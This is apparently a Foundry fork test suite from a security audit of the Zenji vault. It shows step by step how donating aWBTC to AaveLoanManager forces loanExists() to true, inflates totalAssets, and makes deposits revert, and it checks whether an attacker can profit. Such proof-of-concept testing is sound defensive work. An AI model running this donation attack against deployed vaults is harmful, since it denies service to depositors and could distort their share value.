// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import { Test, console } from "forge-std/Test.sol";
import { ZenjiForkTestBase } from "./base/ZenjiForkTestBase.sol";
import { Zenji } from "../src/Zenji.sol";
import { AaveLoanManager } from "../src/lenders/AaveLoanManager.sol";
import { UniversalRouterV3SingleHopSwapper } from "../src/swappers/base/UniversalRouterV3SingleHopSwapper.sol";
import { UsdtIporYieldStrategy } from "../src/strategies/UsdtIporYieldStrategy.sol";
import { IChainlinkOracle } from "../src/interfaces/IChainlinkOracle.sol";
import { IERC20 } from "../src/interfaces/IERC20.sol";
import { IAavePool } from "../src/interfaces/IAavePool.sol";

/// @title H5_ATokenDonation
/// @notice Hypothesis H-5: Attacker transfers aTokens directly to AaveLoanManager to force
///         loanExists() = true, causing share price distortion and incorrect deploy path.
///
/// ATTACK VECTOR:
///   1. Attacker supplies WBTC directly to Aave, receives aWBTC
///   2. Attacker transfers aWBTC to AaveLoanManager
///   3. loanExists() now returns true (aToken.balanceOf(this) > 0)
///   4. Next deposit() calls _deployCapital() -> addCollateral+borrowMore (not createLoan)
///   5. Accounting inflated: getNetCollateralValue() counts donated aTokens as vault collateral
///
/// ECONOMIC QUESTION: Is there profit? Attacker donates real WBTC value -
///   does the victim vault mis-price shares as a result?
contract H5_ATokenDonation is ZenjiForkTestBase {
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant AAVE_A_WBTC = 0x5Ee5bf7ae06D1Be5997A1A72006FE6C607eC6DE8;
    address constant AAVE_VAR_DEBT_USDT = 0x6df1C1E379bC5a00a7b4C6e67A203333772f45A8;

    address constant IPOR_PLASMA_VAULT = 0xbfA9d6EC0E04B6691fCAE5F8b48838C3918eC117;
    address constant USDT_CRVUSD_POOL = 0x390f3595bCa2Df7d23783dFd126427CCeb997BF4;

    address constant UNIVERSAL_ROUTER = 0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af;
    uint24 constant WBTC_USDT_V3_FEE = 3000;

    address constant BTC_USD_ORACLE = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c;
    address constant USDT_USD_ORACLE = 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D;
    address constant CRVUSD_USD_ORACLE = 0xEEf0C605546958c1f899b6fB336C20671f9cD49F;

    address constant CRVUSD = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E;

    address attacker = makeAddr("attacker");
    UniversalRouterV3SingleHopSwapper public swapper;

    function _collateral() internal pure override returns (address) {
        return WBTC;
    }

    function _unit() internal pure override returns (uint256) {
        return 1e8; // 1 WBTC
    }

    function _tinyDeposit() internal pure override returns (uint256) {
        return 1e6; // 0.01 WBTC
    }

    function _oracleList() internal pure override returns (address[] memory) {
        address[] memory oracles = new address[](3);
        oracles[0] = BTC_USD_ORACLE;
        oracles[1] = USDT_USD_ORACLE;
        oracles[2] = CRVUSD_USD_ORACLE;
        return oracles;
    }

    function _collateralPriceOracle() internal pure override returns (address) {
        return BTC_USD_ORACLE;
    }

    function _deployVaultContracts() internal override {
        uint256 startNonce = vm.getNonce(address(this));
        address expectedVaultAddress = computeCreateAddress(address(this), startNonce + 3);

        swapper = new UniversalRouterV3SingleHopSwapper(
            owner, WBTC, USDT, UNIVERSAL_ROUTER, WBTC_USDT_V3_FEE, BTC_USD_ORACLE, USDT_USD_ORACLE
        );

        UsdtIporYieldStrategy strategy = new UsdtIporYieldStrategy(
            USDT,
            CRVUSD,
            expectedVaultAddress,
            USDT_CRVUSD_POOL,
            IPOR_PLASMA_VAULT,
            0,
            1,
            CRVUSD_USD_ORACLE,
            USDT_USD_ORACLE
        );

        loanManager = new AaveLoanManager(
            WBTC,
            USDT,
            AAVE_A_WBTC,
            AAVE_VAR_DEBT_USDT,
            AAVE_POOL,
            BTC_USD_ORACLE,
            USDT_USD_ORACLE,
            address(swapper),
            7500,
            8000,
            expectedVaultAddress,
            0 // eMode: disabled
        );

        vault = new Zenji(
            WBTC,
            USDT,
            address(loanManager),
            address(strategy),
            address(swapper),
            owner,
            address(viewHelper)
        );
        require(address(vault) == expectedVaultAddress, "Vault address mismatch");

        vm.prank(owner);
        swapper.setVault(address(vault));
        yieldStrategy = strategy;
    }

    function _postDeploySetup() internal override {
        vm.prank(owner);
        swapper.setSlippage(2e16);
        _syncAndMockOracles();
    }

    // ============================================================
    // STEP 0: Unit test - does transferring aWBTC force loanExists?
    // ============================================================

    /// @notice Proves that transferring aWBTC to AaveLoanManager sets loanExists() = true
    ///         even before ANY real vault position exists.
    function test_H5_aTokenDonation_forcesLoanExists() public {
        _deployVault();

        // Baseline: no loan exists yet
        assertFalse(loanManager.loanExists(), "H5: loan should not exist before donation");
        assertEq(
            IERC20(AAVE_A_WBTC).balanceOf(address(loanManager)),
            0,
            "H5: aToken balance should be 0 before donation"
        );

        // Attacker supplies WBTC to Aave and receives aWBTC
        uint256 attackerWbtc = 1e6; // 0.01 WBTC (small but non-zero)
        deal(WBTC, attacker, attackerWbtc);

        vm.startPrank(attacker);
        IERC20(WBTC).approve(AAVE_POOL, attackerWbtc);
        IAavePool(AAVE_POOL).supply(WBTC, attackerWbtc, attacker, 0);
        uint256 attackerATokenBalance = IERC20(AAVE_A_WBTC).balanceOf(attacker);
        console.log("Attacker aWBTC balance after supply: %d", attackerATokenBalance);
        assertGt(attackerATokenBalance, 0, "H5: attacker should have aWBTC after supply");

        // Attacker transfers aWBTC to AaveLoanManager
        IERC20(AAVE_A_WBTC).transfer(address(loanManager), attackerATokenBalance);
        vm.stopPrank();

        // ASSERT: loanExists() now returns true even though vault has NO real position
        uint256 lmATokenBalance = IERC20(AAVE_A_WBTC).balanceOf(address(loanManager));
        console.log("LoanManager aWBTC balance after donation: %d", lmATokenBalance);
        assertGt(lmATokenBalance, 0, "H5: donation should have transferred aWBTC to loanManager");

        // This is the key assertion: loanExists() returns true based on balance alone
        assertTrue(loanManager.loanExists(), "H5: loanExists() returns true due to donated aWBTC");
        console.log("[CONFIRMED] loanExists() = true with no real vault position");
    }

    // ============================================================
    // STEP 1: Does the donation force the addCollateral path?
    //         And does that path succeed (creating a real position)?
    // ============================================================

    /// @notice Proves that after donation, deposit() is forced into the existing-loan path
    ///         and currently reverts during the downstream borrow step.
    function test_H5_aTokenDonation_forcesAddCollateralPath() public {
        _deployVault();

        // Attacker donates aWBTC to AaveLoanManager
        uint256 attackerWbtc = 1e6; // 0.01 WBTC
        deal(WBTC, attacker, attackerWbtc);
        vm.startPrank(attacker);
        IERC20(WBTC).approve(AAVE_POOL, attackerWbtc);
        IAavePool(AAVE_POOL).supply(WBTC, attackerWbtc, attacker, 0);
        uint256 aTokenToTransfer = IERC20(AAVE_A_WBTC).balanceOf(attacker);
        IERC20(AAVE_A_WBTC).transfer(address(loanManager), aTokenToTransfer);
        vm.stopPrank();

        assertTrue(loanManager.loanExists(), "H5: precondition - loanExists() should be true");

        // Record total collateral before deposit
        uint256 totalCollateralBefore = vault.getTotalCollateral();
        console.log("totalCollateral before deposit: %d", totalCollateralBefore);
        // This includes the donated aTokens via getNetCollateralValue()
        // donated aTokens -> aToken.balanceOf(lm) > 0, debt = 0
        // getNetCollateralValue = collateral - debtInCollateral = attackerATokenBalance - 0
        assertGt(
            totalCollateralBefore,
            0,
            "H5: totalCollateral should be non-zero from donated aTokens"
        );
        console.log(
            "[CONFIRMED] Donated aTokens inflate totalCollateral before any real deposit: %d",
            totalCollateralBefore
        );

        // Now a legitimate user deposits. Because loanExists() is true from the donation,
        // Zenji takes the addCollateral+borrowMore path instead of createLoan().
        // Current behavior: this path reverts in Aave during borrowMore.
        uint256 depositAmount = 1e8; // 1 WBTC
        vm.startPrank(user1);
        collateralToken.approve(address(vault), depositAmount);
        vm.expectRevert();
        vault.deposit(depositAmount, user1);
        vm.stopPrank();

        // Verify the donation still forces loanExists and causes a denial of deposit path.
        assertTrue(loanManager.loanExists(), "H5: donated aTokens should keep loanExists true");
        console.log("[CONFIRMED] donation forces existing-loan path and deposit reverts");
    }

    // ============================================================
    // STEP 2: Share price distortion - can attacker profit?
    //         Attacker donates then deposits after to get inflated shares?
    // ============================================================

    /// @notice Tests the current donated-aToken behavior against a clean baseline.
    ///         In the donated scenario, the first deposit is currently denied rather than
    ///         succeeding at a distorted share price.
    ///
    /// Setup: (a) honest depositor goes first in CLEAN vault, (b) attacker donates then
    ///        another depositor goes second - measures if donation shifts value.
    function test_H5_sharePriceDistortion_cleanVsWithDonation() public {
        // === SCENARIO A: Clean vault (no donation) ===
        // Deploy fresh vault and record user1 shares for 1 WBTC deposit
        _deployVault();
        uint256 depositAmount = 1e8; // 1 WBTC

        uint256 sharesClean = _depositAs(user1, depositAmount);
        uint256 totalCollateralClean = vault.getTotalCollateral();
        console.log("CLEAN: shares for 1 WBTC = %d", sharesClean);
        console.log("CLEAN: totalCollateral after deposit = %d", totalCollateralClean);

        // === SCENARIO B: Vault with aToken donation BEFORE first deposit ===
        // Re-deploy vault to get a clean state
        _deployVaultContracts();
        _postDeploySetup();
        _syncAndMockOracles();

        // Attacker donates aWBTC
        uint256 donationWbtc = 1e6; // 0.01 WBTC donated
        deal(WBTC, attacker, donationWbtc);
        vm.startPrank(attacker);
        IERC20(WBTC).approve(AAVE_POOL, donationWbtc);
        IAavePool(AAVE_POOL).supply(WBTC, donationWbtc, attacker, 0);
        uint256 aTokenDonated = IERC20(AAVE_A_WBTC).balanceOf(attacker);
        IERC20(AAVE_A_WBTC).transfer(address(loanManager), aTokenDonated);
        vm.stopPrank();

        uint256 totalCollateralBeforeDeposit = vault.getTotalCollateral();
        console.log("DONATED: totalCollateral before deposit = %d", totalCollateralBeforeDeposit);

        // User2 deposit in donated vault currently reverts instead of succeeding with distorted shares.
        vm.startPrank(user2);
        collateralToken.approve(address(vault), depositAmount);
        vm.expectRevert();
        vault.deposit(depositAmount, user2);
        vm.stopPrank();

        console.log("CLEAN: shares for 1 WBTC = %d", sharesClean);
        console.log("[CONFIRMED] donated-aToken scenario blocks deposit instead of repricing shares");
    }

    // ============================================================
    // STEP 3: Full attack PoC - can attacker extract profit?
    //         1. Attacker donates aWBTC pre-deposit
    //         2. Attacker deposits AFTER user1 to get fair shares
    //         3. User1 deposits and gets inflated price
    //         4. Attacker redeems for profit?
    // ============================================================

    /// @notice Full attack path: attacker donates, deposits, user1 gets ripped off.
    ///
    /// In a standard donation attack: frontrun first depositor, donate, then the first
    /// depositor's shares are worth less. But here the attacker needs to ALSO be a
    /// depositor to profit -- otherwise they just donated value to existing depositors.
    ///
    /// This tests whether the attacker can profit from:
    ///   1. Deposit first (get clean price shares)
    ///   2. Donate aWBTC (inflate totalCollateral without getting shares)
    ///   3. Next depositor gets fewer shares for same amount
    ///   4. Attacker redeems their shares -- now worth more since totalCollateral includes donation
    function test_H5_fullAttackPath_profitExtraction() public {
        _deployVault();

        // Step 1: Attacker deposits FIRST (before donation) to get fair share price
        uint256 attackerDeposit = 1e8; // 1 WBTC
        deal(WBTC, attacker, attackerDeposit + 1e6); // extra 0.01 WBTC for donation
        vm.startPrank(attacker);
        IERC20(WBTC).approve(address(vault), attackerDeposit);
        uint256 attackerShares = vault.deposit(attackerDeposit, attacker);
        vm.stopPrank();
        vm.roll(block.number + 1);
        console.log("Attacker deposited %d WBTC, got %d shares", attackerDeposit, attackerShares);

        // Step 2: Attacker donates aWBTC to inflate totalCollateral
        uint256 donationWbtc = 1e6; // 0.01 WBTC
        vm.startPrank(attacker);
        IERC20(WBTC).approve(AAVE_POOL, donationWbtc);
        IAavePool(AAVE_POOL).supply(WBTC, donationWbtc, attacker, 0);
        uint256 aTokenDonated = IERC20(AAVE_A_WBTC).balanceOf(attacker);
        IERC20(AAVE_A_WBTC).transfer(address(loanManager), aTokenDonated);
        vm.stopPrank();

        uint256 totalCollateralAfterDonation = vault.getTotalCollateral();
        console.log("totalCollateral after donation: %d", totalCollateralAfterDonation);

        // Step 3: Victim user1 deposits same amount as attacker
        // Victim gets fewer shares because totalCollateral is now inflated
        uint256 victimDeposit = 1e8; // 1 WBTC
        uint256 victimSharesBefore = _depositAs(user1, victimDeposit);
        console.log("Victim deposited %d WBTC, got %d shares", victimDeposit, victimSharesBefore);
        console.log("Attacker shares: %d, Victim shares: %d", attackerShares, victimSharesBefore);

        // Step 4: Attacker redeems -- does their collateral exceed their deposit?
        _refreshOracles();

        uint256 attackerCollateralBefore = IERC20(WBTC).balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(attackerShares, attacker, attacker);
        uint256 attackerCollateralAfter = IERC20(WBTC).balanceOf(attacker);
        uint256 attackerRedeemed = attackerCollateralAfter - attackerCollateralBefore;

        console.log("Attacker deposited: %d WBTC", attackerDeposit);
        console.log("Attacker donated:   %d WBTC (as aToken)", donationWbtc);
        console.log("Attacker redeemed:  %d WBTC", attackerRedeemed);

        if (attackerRedeemed > attackerDeposit + donationWbtc) {
            console.log("[CONFIRMED PROFIT] Attacker extracted profit from donation attack");
            console.log("Profit: %d sats", attackerRedeemed - attackerDeposit - donationWbtc);
        } else {
            console.log("[NO PROFIT] Attacker could not extract profit (lost or broke even)");
            // Note: even if no profit, the behavioral change (forced addCollateral path) may
            // still constitute a bug if it causes downstream failures
        }

        // Check victim's position -- were they harmed?
        _refreshOracles();
        uint256 victimCollateralBefore = IERC20(WBTC).balanceOf(user1);
        vm.prank(user1);
        vault.redeem(victimSharesBefore, user1, user1);
        uint256 victimCollateralAfter = IERC20(WBTC).balanceOf(user1);
        uint256 victimRedeemed = victimCollateralAfter - victimCollateralBefore;

        console.log("Victim deposited:  %d WBTC", victimDeposit);
        console.log("Victim redeemed:   %d WBTC", victimRedeemed);

        if (victimRedeemed < victimDeposit) {
            uint256 victimLoss = victimDeposit - victimRedeemed;
            uint256 lossBps = (victimLoss * 10000) / victimDeposit;
            console.log("Victim loss: %d sats (%d bps)", victimLoss, lossBps);
        }

        // Attacker net cost = depositAmount + donationAmount - redeemed
        // If attackerRedeemed > attackerDeposit: attacker profited (victim paid the difference)
        // If attackerRedeemed < attackerDeposit + donationAmount: attacker had a net loss
        assertGe(
            attackerRedeemed + victimRedeemed,
            attackerDeposit + victimDeposit - (attackerDeposit / 20),
            "H5: total value should not disappear (>5% total loss is unexpected)"
        );
    }

    // ============================================================
    // STEP 4: Behavioral test - does donation block createLoan path?
    // ============================================================

    /// @notice Directly tests that donation changes the code path in _deployCapital and
    ///         currently causes the deposit to revert.
    function test_H5_donationChangesBehavior_noRevert() public {
        _deployVault();

        // Pre-conditions
        assertFalse(loanManager.loanExists(), "H5: no loan initially");

        // Attacker donates
        uint256 donationWbtc = 1e5; // minimal: 0.001 WBTC
        deal(WBTC, attacker, donationWbtc);
        vm.startPrank(attacker);
        IERC20(WBTC).approve(AAVE_POOL, donationWbtc);
        IAavePool(AAVE_POOL).supply(WBTC, donationWbtc, attacker, 0);
        IERC20(AAVE_A_WBTC).transfer(
            address(loanManager), IERC20(AAVE_A_WBTC).balanceOf(attacker)
        );
        vm.stopPrank();

        assertTrue(loanManager.loanExists(), "H5: donation forces loanExists = true");

        // Normal deposit currently reverts once donation forces the existing-loan path.
        uint256 depositAmount = 1e8; // 1 WBTC
        vm.startPrank(user1);
        collateralToken.approve(address(vault), depositAmount);
        vm.expectRevert();
        vault.deposit(depositAmount, user1);
        vm.stopPrank();

        assertTrue(
            loanManager.loanExists(), "H5: loanExists remains true after donation"
        );
        console.log("[CONFIRMED] Donation forces addCollateral path and deposit reverts");
        console.log(
            "aToken balance of loanManager after: %d",
            IERC20(AAVE_A_WBTC).balanceOf(address(loanManager))
        );
    }

    // ============================================================
    // STEP 5: Accounting inflation check
    // ============================================================

    /// @notice Directly measures whether donated aTokens inflate totalAssets() (totalCollateral),
    ///         which is the direct mechanism for share price distortion.
    function test_H5_donatedATokensInflateTotalAssets() public {
        _deployVault();

        // Baseline: empty vault
        uint256 totalAssetsBaseline = vault.totalAssets();
        console.log("totalAssets (baseline, empty vault): %d", totalAssetsBaseline);
        assertEq(totalAssetsBaseline, 0, "H5: empty vault should have 0 total assets");

        // Donate aWBTC
        uint256 donationWbtc = 1e6; // 0.01 WBTC
        deal(WBTC, attacker, donationWbtc);
        vm.startPrank(attacker);
        IERC20(WBTC).approve(AAVE_POOL, donationWbtc);
        IAavePool(AAVE_POOL).supply(WBTC, donationWbtc, attacker, 0);
        uint256 donated = IERC20(AAVE_A_WBTC).balanceOf(attacker);
        IERC20(AAVE_A_WBTC).transfer(address(loanManager), donated);
        vm.stopPrank();

        uint256 totalAssetsAfterDonation = vault.totalAssets();
        console.log(
            "totalAssets after donation: %d (donated aTokens: %d)",
            totalAssetsAfterDonation,
            donated
        );

        // CRITICAL ASSERTION: donated aTokens inflate totalAssets
        // This means share pricing formula now divides by (totalAssets + VIRTUAL_SHARE_OFFSET)
        // instead of (0 + VIRTUAL_SHARE_OFFSET), artificially increasing share price
        assertGt(
            totalAssetsAfterDonation,
            0,
            "H5: Donated aTokens inflate totalAssets() -- share price distorted"
        );

        // Magnitude check: VIRTUAL_SHARE_OFFSET for WBTC vault = 1e5
        // If donated = 1e6, share price inflation = donated / (donated + VIRTUAL_SHARE_OFFSET)
        // = 1e6 / (1e6 + 1e5) = ~90.9% inflation at this scale
        uint256 offset = vault.VIRTUAL_SHARE_OFFSET();
        console.log("VIRTUAL_SHARE_OFFSET: %d", offset);
        console.log("Donation as multiple of VIRTUAL_SHARE_OFFSET: %d x", donated / offset);

        if (donated > offset) {
            console.log(
                "[HIGH SEVERITY] Donation (%d sats) exceeds VIRTUAL_SHARE_OFFSET (%d sats) by %dx",
                donated,
                offset,
                donated / offset
            );
            console.log("Share price inflation: donation overwhelms the inflation guard");
        }
    }
}
